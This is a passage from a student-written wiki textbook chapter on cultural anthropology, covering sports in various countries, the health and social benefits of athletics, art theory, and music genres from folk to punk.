Brazil.  It is important to note that sports do not always create unity. Sports bring out a aggressive and competitive side in all athletes. However, those with those qualities are the ones to watch for they truly know how to play the sport and aren't afraid to play dirty. They also highlight inequalities, such as gender segregation between men and women. Brazilian women are far less interested in soccer, and as a result, remain separate from men in that aspect. (I don't believe this last statement is very accurate. Brazilian women are some of the most passionate soccer fans in the world. Also, Brazil women's national team is among the most successful club in the sport.)&lt;ref&gt; Emmanuele Grossi &lt;/ref&gt;

Just as in Brazil, soccer is a major characteristic of Serbian culture that is traditionally considered a male sport. In the Republic of Serbia it is thought that playing soccer enhances qualities. These aspects include aggressiveness, competition, physical strength, coordination, teamwork, discipline, and speed. These are all qualities attributed to the male gender. It is a common practice for men to watch games together in their homes, in front of local stores, etc. Women are not welcomed at these gatherings and are often asked to leave before the game starts or asked not to come until the game is over. This male dominated aspect of Serbian culture parallels the gender segregation between men and women found in Brazil.&lt;ref&gt;Masa Vukanovich. April 2002. http://www.anthrobase.com/Txt/V/Vukanovich_M_01.htm&lt;/ref&gt; Another inequality that soccer highlights is the difference between the upper class society and lower class society. Soccer was especially practiced by the lower income people throughout the 20th century. Many poor boys are dreaming of becoming the next Pele or Ronaldo and because of this, they promote the national soccer culture even more. Dreaming about soccer is a motivation for millions of poor children who want to escape from their poverty. The combination of soccer and living in poverty balances out the good and the bad. In Brazilian life it's not uncommon for soccer culture to have a bigger influence than politics or economics. 
&lt;ref&gt;Schultz, Emily A., and Robert H. Lavenda. Cultural Anthropology A Perspective on the Human Condition with free Study Skills Guide on CD-ROM. New York: Oxford UP, USA, 2004.&lt;/ref&gt;

In Italy “calcio” (football / soccer) is a symbol of national pride for many people. From childhood on, it is stressed that one must become a loyal supporter of the local club team. This passion can quickly ignite rivalries with neighboring towns and cities. It is not uncommon for the “tifosi” (fans) to start fights at soccer stadiums. Every four years, the World Cup Tournament unites Italians from different economical, political, and geographical backgrounds into one proud country. This strong national pride as helped the “Azzuri” win four World Cup Trophies and one European Championship.
&lt;ref&gt; Emmanuele Grossi (I was born In Italy and lived there for half of my life. I have been a soccer fan and player for as long as i can remember.) &lt;/ref&gt;

Soccer in the Northwest United States is growing, but participant numbers are still below those of the main American sports (Football, basketball and baseball). There are increasingly more fields and complexes to play on, which adds the growth of the sport. The largest current addition to Northwest soccer came when Seattle was given an MLS team, The Sounders, in 2009. While the sounders have been around since 1994 in the USL First Division&lt;ref&gt; http://en.wikipedia.org/wiki/Seattle_Sounders&lt;/ref&gt;, this is their Major League Soccer début. Seattle has embraced their new team selling out their first four games.
&lt;ref&gt; Zach Graeber (I have been playing soccer around the sound for 13 years and have seen the growth of clubs and development of fields. I also have followed the Sounders for years)&lt;/ref&gt;

===American Football===
In the state of Texas, Football (American) is a cultural phenomenon.  Children are regularly held back in school in order to be more physically capable for football later in their schooling careers. Education has taken a back seat when compared to football, leading many parents and citizens to question the ethics of promoting football over intellectual pursuits. The fanaticism of football in Texas rivals that of the rest of the worlds obsession with soccer.
&lt;ref&gt; Kevin Davis (I lived in Texas and saw this happen to many of my friends as I was growing up.)&lt;/ref&gt;

Texas may be the state with the most passion about American Football out of the United States, but most of the other forty-nine states also have that same love for the game. The game has many widely televised games that draw a large audience every year. These games include the Super Bowl by drawing in hundreds of millions of television viewers each year in early February, and college football's multiple BCS (Bowl Championship Series) bowl games that occur around and on New Years Day. &lt;ref&gt;(Football in the USA: American Culture and the World’s Game by Peter S. Morris, Nov. 2004)&lt;/ref&gt;
Florida's love of football is not as big as Texas but with five college teams to choose from and three NFL teams the choice of a team to follow depends on where you live. Also there is a rivalry between Florida and Florida State they call it the battle in the swamp and the state of Florida is pretty much divided when these two teams play.

The National Football League (NFL) is the where there are 32 pro teams all around the United States. The NFL has all the best football players in the world playing in their league. The majority of the players get into the league through the NFL Draft. In the past, the draft consisted of 17 rounds where all the teams would have one selection each round. Now there are seven rounds in the draft where each team has one selection in each round. The minority of players who get into the NFL when they don't get drafted is when they get signed as a undrafted free agent. This typically occurs during the next few days after the NFL Draft. The NFL is becoming more popular globally. In the 2008-09 NFL season, the New Orleans Saints and the San Diego Chargers played regular season game in London. This was done to help make the NFL more global. The NFL plans to have more regular season games located outside the United States in the future.

===Baseball===
Another sport that aids political, social, and economic aspects of culture is baseball. This universal sport has been the center of cultural life in the Dominican Republic, connecting Dominicans to each other, as well as to the rest of the Caribbean for over 100 years. &lt;ref&gt;The Tropic of Baseball: Baseball in the Dominican Republic. http://books.google.com/books?id=kloGyBSEsRsC&amp;printsec=frontcover#PPP1,M1&lt;/ref&gt; This small Caribbean island has been the home to many of the best players in Major League Baseball in the United States, where the major league is run and the world series is played. Major League Heroes such as Sammy Sosa, Pedro Martinez, and David Ortiz all excelled in this sport in the Dominican Republic in order to reach their ultimate goal of playing professionally in the United States. Since the Dominican Republic is an economically poor country, little boys and teenagers alike work their entire lives to try to be the best baseball player that they can be. This constant competition is a great source of entertainment, which is why baseball games are a huge part of Dominican culture. Quite like soccer, though, most women are forbidden to partake in this sport. This rule is not so much sexism as it is an attempt to keep women safe. Dominicans believe that baseball is a dangerous sport for women because of the hard ball that can be hit anywhere at any given moment. Although it is not a law that women cannot play baseball, they traditionally do not partake in this cultural pastime. For men in the Dominican Republic Baseball is not only a great hobby and way to relate to each other, it is also an opportunity to strive to become the best athletes they can possibly become.
&lt;ref&gt; Klein, Alan M. Culture, Politics, and Baseball in the Dominican Republic. http://www.jstor.org/stable/2634143 &lt;/ref&gt;

===Basketball===
Equally popular in the United States is the sport of basketball, which has a growing global following as well. Basketball is played with five players on each team. Most professional level basketball players are immensely tall. Basketball is played widely throughout the United States and is popular with both men and women, both having professional leagues. It is a tremendously competitive sport that takes tremendous athletic ability to become skilled. Basketball is also one of the most popular and widely viewed sports in the world.

In 1949 the NBA, National Basketball Association, replaced the BAA, Basketball Association of America which had first been organized in 1946. This franchise has become so large that is the top professional basketball in the world based on salary, popularity, talent and competition levels. An approximate 17,558 spectators attend these games regularly with the Chicago Bulls, Detroit Pistons, and Cleveland Cavaliers bringing in the most.

The battle for equality of woman's sports has been an ongoing struggle for many years. The WNBA wasn't started until 1997, but with stars such as Sheryl Swoopes, Cynthia Cooper, Lisa Leslie, Diana Taurasi, and Candace Parker made a rise in popularity. Sheryl Swoopes and Cynthia Cooper lead the Houston Comets to wins in the first four WNBA championships and were the first WNBA dynasty. The WNBA has become so popular that its viewers has topped that of both the NHL and MLB. Title IX helped make a huge impact on the WNBA because it helped out college basketball players, allowing to give them scholarships. Besides the United States, basketball is also extremely popular in many other countries.

===Rowing===
Rowing, also known as crew, is an age-old sport dating all the way back to 1274, coming up in Venetian documentations as boat races between different forms of aquatic “display and entertainment.” It was known before then as a life saving method. A couple hundred years later, royal boat parades were held in London. Between 1454 and the early 1800’s several different forms of parades, festivals and spectacles were watched by thousands of viewers. In 1805 the first modern boat race, or regatta, was held in Australia. The first crew race to include women was sighted in 1814. 1829 began the ever-ceremonious race between Oxford and Cambridge, a rival that still continues today. The first American inter-collegiate race was between Brown, Harvard, Trinity, and Yale in 1858 in Springfield, Massachusetts. It was cancelled due to one of Yale’s boats men drowning, therefore, no winner was declared. That was also the major beginning of the sport in the United States. The Inter-collegiate Rowing Association, or IRA was formed in 1895, holding its landmark regatta on the Hudson River in New York. 1923 was the first year a western team had ever won the IRAs, the University of Washington claiming the victory. The U.S. men’s eight received their third gold medal at the World Championship in 1999.  Rowing is such a big part of the ivy-league schools and is quickly spreading to other state universities, becoming widely renowned.&lt;ref&gt; www.rowinghistory.net &lt;/ref&gt;

===Other Sports===
Sports also provide a safe alternative to political conflicts.  When two conflicting countries meet in a sports arena, the rivalry is never more intense.  European soccer has often swayed relationships between countries, and perhaps one of the most awesome instances of this power of sport came in the 1980 Olympics, when the United States defeated the dominant USSR in the semifinal round of hockey.  Although America was in a time of crisis, the U.S. Hockey teams race for gold brought hope to an entire nation in despair.

Historically lacrosse dominated the culture of many native American tribes.  It was used to settle inter-tribal disputes, toughen the young men, celebrate festivals, and for religious reasons. It helped keep the six nations of the Iroquois united. The Mohawk Indians called it the little brother of war.  All of the able bodied men would compete on a field that could be from 500 meters to a few miles long.  The games would last from sun up to sun down for up to three days.&lt;ref&gt; http://www.stxlacrosse.com/theculture/history.cfm&lt;/ref&gt;
Lacrosse since then has shifted away from a cultural tradition into a sport played by people of all ages.

Taekwondo is the national sport of South Korea.  This form of martial arts has spread worldwide and is the most popular by means of people who practice this form.  Taekwondo in Korean means “the way of the kicking and punching.”  This form of fighting is a main part of South Korea's military training.  It combines the uses of self defense, sport, philosophy, and meditation.  It is also a sport for the summer Olympics.

Videogames are becoming increasingly popular in developed countries, such as American, Japan, and some European countries, so much so that an new format of professional gaming is being developed. Major League Gaming (MLG) is growing in nations all around the world, setting up tournaments with the goal of winning cash prizes. These prizes can exceed 10,000 for team play, and individual play around 6,000 dollars. Games such as counterstrike and Halo 3 are the leading games played. 
&lt;ref&gt;wikipedia, Taekwondo,http://en.wikipedia.org/wiki/Taekwondo&lt;/ref&gt;

===Professional Sport Salaries===
Professional sports athletes can earn tremendous amounts of money. They are some of the wealthiest individuals on the planet. Tiger Woods was the highest paid athlete in 2008, raking in a jaw dropping $127,902,706 and almost $800 million for his entire career including both tournaments won and endorsements from companies. Lebron James made an astounding $40,455,000 in 2008. Alex Rodriguez signed with the Yankees  for 10 years worth $275 million.&lt;ref&gt;http://sportsillustrated.cnn.com/more/specials/fortunate50/2008/index.html&lt;/ref&gt; The odds of becoming a professional athlete are terrible. Approximately 2-4 people out of 100,000 will become a paid athlete.&lt;ref&gt;http://www.humanismbyjoe.com/Academics_Not_Athletics.htm&lt;/ref&gt;

One thing to notice about these superstars is that many play in the United States.  While sports are big in every country to some extent- American's view entertainment much as the Roman's did ages ago.  The U.S. is like a modern day Rome in how much value we place on this entertainment- so much so that we pay NFL players millions of dollars to run around for our amusement.

===Positive Effect of Getting Involved in Sports===
Becoming involved with sports is beneficial in a number of ways. It promotes a healthy lifestyle, team building opportunities, strength, perseverance, leadership, discipline and confidence in yourself and your abilities on and off the field. These are all important characteristics that will help children grow into strong, independent, smart and driven individuals. Through the participation in sports, a young person faces hardships that they learn to overcome. This translates into confidence when they face hardships in other aspects of life. Growing up with these values in place will make the transition to adulthood a lot easier. It is hard to stand strong against peer pressures if a person doesn't have their core values and inner strength developed. Being physically fit also increases confidence and body posture.  Participating in sports is a great way to improve self esteem and become a physically and mentally strong individual. It has been researched and possibly proven that teenage girls that are involved in sports may lead safer and more productive lifestyles. &lt;ref&gt;Brittney Lundberg&lt;/ref&gt;


Many girls who are not involved in physical activities are at higher risks of teen pregnancy, abusive relationships, and developing eating disorders.  According to The California Women's Law Center stated that, &quot;female athletes are more likely to have their first intercourse at a later age, more likely to use contraceptives, have sex less often, and have fewer sexual partners. Not surprisingly, female athletes are more than half as likely to get pregnant as female non-athletes.&quot; Girls that gain confidence and self-esteem by participating in sports are more likely to make more responsible and smart decisions that affect their life. It has also been proven that female athletes get better grades and perform well on standardized tests. For example, swimming is one of the top academic performing sports along with tennis and track and field. The habits of the sports carry over into school performance. When girls are given goals and kept busy their focus becomes in lined with what is best for their physical and emotional health. Coaches and parents begin to develop subconscious expectations for the athletes that keeps them from getting involved with activities that they shouldn’t be involved in. Athletes (girls AND boys) are better able to keep on task and stay organized. &lt;ref&gt;Brittney Lundberg&lt;/ref&gt;


A test done by Russell R. Pate, PhD; Stewart G. Trost, PhD; Sarah Levin, PhD; Marsha Dowda, DrPH found that approximately 70% of male students and 53% of female students reported participating on 1 or more sports teams in school and/or nonschool settings; rates varied substantially by age, sex, and ethnicity. Male sports participants were more likely than male nonparticipants to report fruit and vegetable consumption on the previous day and less likely to report cigarette smoking, cocaine and other illegal drug use, and trying to lose weight. Compared with female nonparticipants, female sports participants were more likely to report consumption of vegetables on the previous day and less likely to report having sexual intercourse in the past 3 months. &lt;http://archpedi.ama-assn.org/cgi/content/abstract/154/9/904&lt;/ref&gt;

:TaeKwonDo
:From a personal experience, I earned my black belt in TaeKwonDo at the age of fifteen. Not only through the whole process of going to practice five days a week and develop physical strength, I learned skills of respect for others and myself that really paid off. I became very independent, a Christian, and set standards for who I am going to date as an act of self-respect. Without TaeKwonDo I know I would still be a very shy and insecure girl. TaeKwonDo has made me the person I am today.  &lt;ref&gt;Brittney Lundberg&lt;/ref&gt;


Sports promote healthy and active life styles and help build strong, confident and independent people in culture's all around the world. Participation in sports has been linked to success in math and science, subjects traditionally dominated by men. One explanation is that sports may help girls resist traditional gender scripts that limit persistence and competition in these areas. To explore this, we contrast the effects of sports for boys and girls on academic domains that are stereotyped as masculine (physics) and feminine (foreign language). Furthermore, we differentiate sports by those characterized as masculine versus feminine to identify activities that may reinforce versus challenge traditional gender norms. Sports overall have positive effects: compared to non-participants of the same sex, girls are more likely to take physics and foreign language, while boys are more likely to take foreign language. The sport categories reveal divergent patterns for boys and girls, with masculine sports associated with physics for girls and foreign language for boys, while feminine sports are associated only with foreign language for girls. These findings confirm prior research that sports improve academics, but suggest that sports do not have uniform effects. While some sports may potentially counteract traditional femininity and help girls persist in masculine domains, other sports may not provide the same benefits.(Crissey, S. R., Pearson, J. and Riegle-Crumb, C.&quot;Gender Differences in the Effects of Sports Participation on Academic Outcomes&quot;)&lt;/p&gt;

&lt;p&gt; Physical exercise is any bodily activity that enhances or maintains physical fitness and overall health. It is performed for many different reasons. These include strengthening muscles and the cardiovascular system, honing athletic skills, weight loss or maintenance, and for enjoyment. Frequent and regular physical exercise boosts the immune system, and helps prevent the &quot;diseases of affluence&quot; such as heart disease, cardiovascular disease, Type 2 diabetes and obesity.[1][2] It also improves mental health and helps prevent depression. Childhood obesity is a growing global concern and physical exercise may help decrease the effects of childhood obesity in developed countries.&lt;ref&gt; http://en.wikipedia.org/wiki/Exercise &lt;/ref&gt;&lt;p&gt;&lt;ref&gt; Kiersten Radden&lt;/ref&gt;’

When being highly involved in sports, overall health becomes a top priority as well. Learning time management skills is key when every day consists of six hours of school, sports, family time and homework because otherwise the human body would be exhausted and worn down and would not be able to perform as well as they could. When people are in better physical shape, it is much more motivating to develop healthy eating habits that will last a life time. Developing healthy eating habits give people more energy to perform well in sports and exercise, and will also help prevent diseases such as heart disease and diabetes. Therefore, exercise through sports and exercise must be accompanied by a healthy overall lifestyle.

Not only did  I learn healthy habits physically, but mentally and emotionally as well. I also developed many long term friendships while participating in sports. Playing sports had a very positive influence on my life and instilled a strong set of morals and integrity. Almost all of my friends were involved in the same sports which gave us a great way to connect with one another. &lt;ref&gt; Brittney Lundberg &lt;/ref&gt; Having healthy habits requires healthy eating habits, which requires the essential nutrients: Protein, carbohydrate, lipids, vitamins, minerals, water. In a society filled with sports and outdoor recreation it’s important to remember that it’s not just the exercise that keeps the body healthy, good nutrition does too. The two go hand in hand and you will have double the results and positive effects by practicing both.

Also knowing your family history is very important when it comes to making lifestyle changes. My grandfather passed away two years ago from pancreatitis from not taking care of his diabetes. His pancreases slowly digested itself resulting in a very painful death. I have family members with diabetes, a history of strokes, and heart attacks on both sides of my family. I know that I need to watch my sugar intake and overall health because I am at high risks. After watching my grandfather die of a preventable disease, I have been motivated to get the proper nutrition and exercise daily. &lt;ref&gt;Brittney Lundberg&lt;/ref&gt;

===Healthy Living===
There is currently an epidemic in America regarding overeating and unhealthy lifestyles. One major concern is that of the rising obesity rate in young children. Children are growing without knowledge of correct diets and exercise and by the time they mature, they have become involved in a lifestyle that is unhealthy. In comparison to other countries, America is falling behind in the movement towards a healthier world. Other reasons for this recent spike concerning obesity in America are the rapid development of technology over the past century, which has almost completely removed physical exercise from our daily routines, unless one makes a purposeful effort to exercise. Some examples of technology that are blamed are the invention of automobiles, which has taken away the aspect of walking from one place to another, and the invention of the assemble line in factories, which makes, packs, and ships food in a faster and more efficient way. &lt;ref&gt;http://books.google.com/books?hl=en&amp;lr=&amp;id=McrESStscH4C&amp;oi=fnd&amp;pg=PR22&amp;dq=american+industrial+revolution&amp;ots=WCKg3xKqDr&amp;sig=y7MO_jMW26YtGkwxN-bVgbNyb1s#v=onepage&amp;q&amp;f=false&lt;/ref&gt; Also from these developments we have achieved the ability to stock grocery store shelves with inexpensive, high calorie, good tasting food produced in bulk.&lt;ref&gt;Michael D. Lemonick. http://www.time.com/time/subscriber/covers/1101040607/article/how_we_grew_so_big_diet01a.html&lt;/ref&gt; These technological developments have allowed America as a society to grow in population, while at the same time damaging the health of its own citizens.


Healthy living and physical fitness are very important aspects in our daily lives. Being physically fit not only helps people live healthy lives; it also helps people live longer.  If you are able to keep up an active lifestyle throughout your life you will be able to slow the onset of osteoporosis as well as reduce chronic disease risk. Also, people who make physical activity and exercise a part of their daily lives when they are young are more likely to keep it in their lives as they grow older and benefit from it throughout their lifespan. Physical activity is defined as any movement that spends energy. Exercise is a subset of physical activity, but it is an activity that is structured and planned. While many children engage in physical activity, usually by playing with their friends, the amount of physical activity they get as they grow into adolescents usually declines. In America today obesity and overweight occur in over 20 % of children. On top of that, inactivity and poor diet contribute to 300,000 deaths per year in America. It’s proven that significant health benefits can be obtained  by including 30 min of moderate physical activity, which must be performed at a minimum of three days per week, and can even be split up into three 10 minute chunks, which will reap the same results as one 30 minute session. However more frequent exercise will certainly lead to more rapid improvements. &lt;ref&gt;Laura Heydrich.

The positives effects of being participating in sports are numerous. First of all, being involved in sports ingrains in you a lot of values and disciplines in the sport you are playing and also just in life. Playing in sports helps you develop team work with your teammates. Everyone on the team is striving for a common goal (to win) and it takes unselfish team play to have success in sports that have teams. It also develops a discipline of hard work. Success doesn’t come easy and in order to succeed in sports and in life, you will need to work your tail off. When you practice dedication and hard work in a sport you play, you realize how much work it takes to succeed and in the future, it is more likely for you to succeed later in life. Sports are very positive. &lt;ref&gt; Phil Jackson, Los Angeles Lakers basketball coach &lt;/ref&gt;

We are currently in the middle of an obesity epidemic within our country. The rate of obese people has tripled in the past 15 years. It's been found that 60+% of American adults are not regularly active. In order to maintain a healthy weight and balance caloric intake you must get a minimum of 60 min of moderate to vigorous activity most if not every day of the week. The rising obesity rate shows problems for development of infants. Due to the increased amount of body fat more overweight babies are being born. Overweight babies are shown to have motor development delays and therefore experience a phase of &quot;catch-up&quot; development. If we begin to instil proper nutrition and exercise habits in adolescents we should be able to keep this epidemic from proceeding into the next generation. &lt;ref&gt; Dave Suprak's lecture for PE 308 &lt;/ref&gt;

===Benefits of a Team===

Working with other athletes on a team creates a tight knit community, for one learns to trust the other players and learns to rely on the help of others in order to obtain a common goal. The environment in a functioning team is collaborative and non-threatening; allowing for more open and focused learning. Skills such as combined effort and compromise are learned far quicker in competition. These sorts of connections can last beyond the field of play and carry into athletes’ social and business lives. For example, how one plays and communicates on the field can reflect how one communicates to members at a business meeting and how they work to obtain their goals. Working in teams can benefit a group to overcome difficult challenges because the minds and work of a group can be more powerful and successful than just one person. They allow for diversity in thought on how to approach a challenge and allow for the group to be sustained by constant support. &lt;ref&gt;http://web2.uqat.ca/marsanm/Readings/ch2%20The%20wisdom%20of%20teams.pdf&lt;/ref&gt; The effects of being on a team can leave a lasting impression on a person and can help their overall well-being.

As a personal testimony to the benefits of sports I played basketball for 12 years, softball for 6, soccer for 4 and am now playing rugby. Sports have maybe me more health-conscious, more motivated, more focused, and more energetic. However, these are not only showcased on the pitch. My ability to focus and to perform under pressure has been carrie dout in my work and also in school. Being part of a team enables me to communicate much better with others, consider others needs, solve critical thinking problems in a more effective way, and has also made me a better leader. sports have given me a better understanding of myself and my role in relationship to those around me.

===Negative Aspects of a Team===

Although teams generally create a positive environment and learning experience, that is not always the case, especially at the high school age level. At high school, anyone is welcomed to try out for sports teams whether they’re experienced or a beginner. In these tryouts, they are instructed to perform various drills to demonstrate ability and potential, which usually result in the older more experienced players being selected for the varsity team, with the less experienced but potentially good younger players on the JV and C teams. The idea of it is to earn your spot on the team, but this does not mean the system is perfect. Many teenagers come into these tryouts working their hardest to prove themselves and earn a position, but many of these same young adults are extremely disappointed and discouraged when they don’t make the team. It is at this time that the coach’s interaction with them is critical. If they are overlooked because their family didn’t know the coach’s family like their friends that made the team did, or because they were recovering from an injuring and weren’t 100%, they automatically feel cheated and frustrated. If the coach is not encouraging to them to try again next year, or doesn’t bother to tell them what he/she saw their strengths and weaknesses as and what they could work on to improve, then they are likely to come away with a bad experience with high school sports. 
And for the students that did make the team, the feeling of relief is only temporary, because although sports are all about competition which can be healthy and motivating, again the coach can turn it into competition among teammates, pitting them against each other for positions and playing time. This can easily create stress not only about doing their best to impress the coach but also worrying about relationships with their teammates as they are trying to build a team with trust and support, while at the same time the players are doing whatever it takes to get ahead of their teammates, creating the opposite effect.

=Cultural Arts=
Art is stemmed from playful creativity; something that all human beings possess. Keep in mind that those activities described as “art” are different from free play because they are circumscribed by rules. This includes sport, dancing, theater arts etc. Artistic rules direct particular attention to, and provide standards for evaluating the form of the activities or objects that artists/players produce.  
Anthropologist Alexander Alland defines art as “play with form producing some aesthetically successful transformation-representation” (1977, 39). In Alland’s definition: form is the appropriate restriction(s) put upon the type of play being organized. For example, a painting is a two-dimensional form. “Aesthetically successful” means the creator of the piece of art” and/or audience “experiences a positive or negative response” from the art piece. Something aesthetically poor in quality will have an unsuccessful response resulting in an emotion of indifference towards the art piece from an audience or even from the author. The easiest way to explain the term transformation-representation is to remember that symbols represent something other than them and may not have any connection with what they are representing. Since Alland suggests that transformation-representation have a dependency on one another, the two should be referred to together as well. Transformation-representation is another way of talking about a metaphor. A drawing is a metaphoric transformation of experience into visible marks on a two-dimensional surface. Also, a poem metaphorically transforms experience into concentrated and tightened language.    
Art by intention includes objects that were made to be art, such as Impressionist paintings. Art by appropriation, however, consists of all the other objects that “became art” because at a certain moment certain people decided that they belonged to a category of art. Most often the category was formed by Western society and the objects or activities may not necessarily fit in that same category in another society’s culture.
&lt;ref&gt; Schultz, Emily A., and Lavenda, Robert H. &lt;u&gt;Cultural Anthropology A Perspective on the Human Condition&lt;/u&gt;. 7th ed. New York: Oxford UP, 2009.
Alland, Alexander. &lt;u&gt;The Artistic Animal&lt;/u&gt;. New York: Doubleday Anchor, 1977.&lt;/ref&gt;   
Anthropologist Shelly Errington argues that in order to transform an object into art, someone must be willing to display it. When Western society sees an item that fits their definition of art, it is placed on the “art” market. Errington also noted that the Western view of art tends to select objects that are: ‘portable, durable, useless for practical purposes in the secular West, and representational.’ A problem exists where Western’s definition of art begins to exploit certain cultures for their objects that offer ‘exotic’ allure. The demand for ‘exotic’ art in Western society, for example, is strong. This art is typically fashionable decoration at one moment and out of fashion next year. This “come-and-go” fashion can threaten international economic policies and resource extraction projects with the artefact bearing society. Similar to play, art challenges its contributors with providing alternative realities and the opportunity to comment on or change worldly views.

==Music==
===Definition===
Above all, music is the organization of sound and silence.  Beyond this, music means many things to many people, including:
# A sound, or the study of such sounds, organized in time in a melodious way.
# (figurative) Any pleasing or interesting sounds
# Something wonderful.
#: ''That's '''music''' to my ears!''
# A guide to playing or singing a particular tune; sheet music.
# Appreciation of or responsiveness to sounds or harmonies
#: Music was in his very soul.
&lt;ref&gt;http://en.wiktionary.org/wiki/music&lt;/ref&gt;
# An art form whose medium is sound organized in time.
&lt;ref&gt;http://en.wikipedia.org/wiki/Music&lt;/ref&gt;

===Introduction===
Music dates back to prehistoric time. The &quot;oldest song&quot; ever discovered was in &quot;cuneiform, dating to 4,000 years ago from Ur.&quot; This indicates to historians that people in many cultures throughout time have listened to, and used music in their cultures. The Greeks in ancient times would use basic pipes to create phonic sounds and compose tunes. Though it wasn't until later music became true entertainment for people in their everyday lives. This happened in the Medieval era when music began to be recorded by writing it down. The Church devoted huge amounts of money to the writing of Gregorian Chants, named for the Pope at the time. It was through the churches that all this music was recorded and saved. With the invention of the printing press, however, more non-theistic music was able to be recorded. The powerful connection people had with each other through music only got strong as the decades went by. It was music that brought the people together during the 14th century because of their poor economy. As the centuries keep going music only becomes more and more powerful and popular. Music is also way to express feelings and stories across time by using selective lyrics or notes. Other creatures, besides humans, also use music as a way to portray an expression through either productive uses like mating songs or simple uses like a singing bird. Music changes with the cultures and people who listen to it, compose it, and invent it. In every corner of the world at any time, one will find music. 
&lt;ref&gt;http://en.wikipedia.org/wiki/History_of_music&lt;/ref&gt;

===Song and Words===
Although the major discussion of text and literature is within the chapter on [Communication and Language], the anthropological study of song, or words as art, warrants its own discussion here in the context of play and art. A quote to keep in mind though when studying cultural arts such as music and dance is &quot;There is nothing more notable in Socrates than that he found time when he as an old man, to learn music and dancing, and he thought is was time well spent.&quot;- Michael De Montaigne&lt;ref&gt;Elizabeth Skolmen&lt;/ref&gt; 

===Indie===

Indie music is music produced without the help of major music labels. Indie is short for &quot;Independent.&quot; Indie artists usually do not associate themselves with big names labels, hence the independence. It is more of a do-it-yourself music. A lot of bands, not only in the US but all over the world, pride themselves in being able to make it big, without the help from a major label. Indie bands also tend to focus on the love of their music more, rather than just trying to make money. While Indie music is becoming more popular with the current generation, independent artists were first recognized in the 1980's, such as the B-52's and later Nirvana. These bands who have made a distinct name for themselves were once considered &quot;college radio music&quot; and made their careers through the independent music scene. &lt;ref&gt;http://www.jstor.org/stable/931257&lt;/ref&gt;

===Folk===
There are a number of different meanings related to folk music, but it is most commonly referred to as traditional music. It has also been known as world music or roots music. The term “Traditional music” is used because it gives it a more specific meaning in order to distinguish it from the other definitions given to describe “folk music.” &lt;ref&gt;http://en.wikipedia.org/wiki/Folk_music&lt;/ref&gt;

=====American Folk Music=====
In American culture, folk music refers to the style that emerged  in the 1960's. Typically folk artists use acoustic instruments and vocals to convey messages about current events, often with lyrics communicating the artist's views on social or political issues. &lt;ref&gt;Laine, Miranda personal experience from talking to father&lt;/ref&gt; The Folk genre exploded in the 1960’s with artists like Bob Dylan and Joan Baez. Before the 1960's explosion of folk music into popular culture, folk music thrived with artists such as Woody Guthrie and Ramblin' Jack Elliot. Some modern day artists such as The Tallest Man On Earth produce music which is heavily influenced by Bob Dylan. &lt;ref&gt;http://en.wikipedia.org/wiki/Woody_Guthrie&lt;/ref&gt;

===Rock and Roll===
Rock and Roll is a form of music that evolved in the United States in the late 1940s and early 1950s. Rock and Roll incorporates elements from many genres including doo-wop, country, soul and gospel, but it is the most closely tied to the blues, a well known example of this is Elvis Presley's music. It is from here that it gains its earliest chord progressions and lyrical style. Many artists have gone on to cover and recreate the sounds of early blues musicians such as Son House, Robert Johnson, Ledbelly, and BB King(the king of blues). This style spread to the rest of the world, causing a huge impact on society. Rock and roll is characterized by an emphasized off beat, or the 2nd and 4th beat of a four-four time signature, guitar use, electronically amplified instrumentation and lyrics that range in terms of subject matter. &lt;ref&gt; http:// http://www.history-of-rock.com/ &lt;/ref&gt;

New York was an important center for several styles of popular music originating in Tin Alley.  Swing Dance bands and the crooners who sang with these bands helped keep American optimism and spirit alive through World War II.  Rock music developed out of the number of different styles of music that existed in the forties and became a style of its own in the early fifties.  In many ways, the popularity of rock music among both black and white musicians and fans aided the movement toward racial integration and mutual respect of people of any ethnic background. &lt;ref&gt; Charlton, Katherine. &quot;Rock Music Styles&quot; &lt;/ref&gt;

====Rock====
Rock Music, birthed from heavy blues influence, has gone on to father countless genres and sub-genres including but not limited to: Punk-Rock, Post-Rock, Hard Rock, Heavy Metal and Grunge.  These Genre's are extremely popular in White/Caucasian cultures stereotypically, though no form of music is ever limited to one culture.

=====Post Rock=====

Post Rock employs basic heavy rock instrumentation and expands upon song structure basing organization around building, which is referred to as crescendo in music terminology.  Post rock bands are largely instrumental (no vocals) and generally don't use a verse-chorus song structure. Instead, a typical post rock song will begin with one musical idea or melody, and build on it until the level of sound and volume are overwhelming. At that point the song is brought back down to a close.  Some popular post rock bands include Explosions In The Sky, This Will Destroy You, and Godspeed You! Black Emperor.

=====Punk Rock=====
Punk rock is a rock music genre that developed between 1974 and 1976 in the United States, the United Kingdom, and Australia. Rooted in garage rock and other forms of what is now known as protopunk music, punk rock bands eschewed the perceived excesses of mainstream 1970s rock. They created fast, hard-edged music, typically with short songs, stripped-down instrumentation, and often political, anti-establishment lyrics. Punk embraces a DIY (do it yourself) ethic, with many bands self-producing their recordings and distributing them through informal channels. This is considered to be “punk rock” style and is as much a stage show as it is a lifestyle.  The ethos of this sub-culture revolves around the idea of self-identity and recognition within a world of consumerist ideology.&lt;ref&gt; Cameron, Keith. &quot;Come the Revolution&quot;. Guardian, July 20, 2007. Retrieved on November 25, 2007.&lt;/ref&gt;  There is no shortage of bands and musicians who fit into this genre, but when looking at actual songs, genuine “punk” is considered to be loud, fast, and short.  These bands generally have a drummer, guitar, and bass, but always include a vocalist which serves as their literal voice as a whole.  The vocalist rarely needs classically trained singing skills and is usually not considered “punk” if they have had training in the past because it is a signal of conformity.  Non-conformity is a large basis of the punk lifestyle and music. However, many punk bands are not the uneducated, drug-using, degenerates people make them out to be. A large number have a &quot;power to the people&quot; outlook on music and life. If there is a social, economic, or political issue going on in the society around the musicians, you will likely hear about it in the lyrics of the music. More often than not, &quot;punk&quot; music contains mindless non-conforming headbanging noise, yet theirs is a smart rebellious sub-culture that fuels the youth with a &quot;stick it to the man&quot; mindset that is necessary to any citizen-run culture.   &lt;ref&gt; http://news.bbc.co.uk/2/hi/entertainment/5263364.stm &lt;/ref&gt;  &lt;ref&gt; Concerts, Friends, Life, Music &lt;/ref&gt;
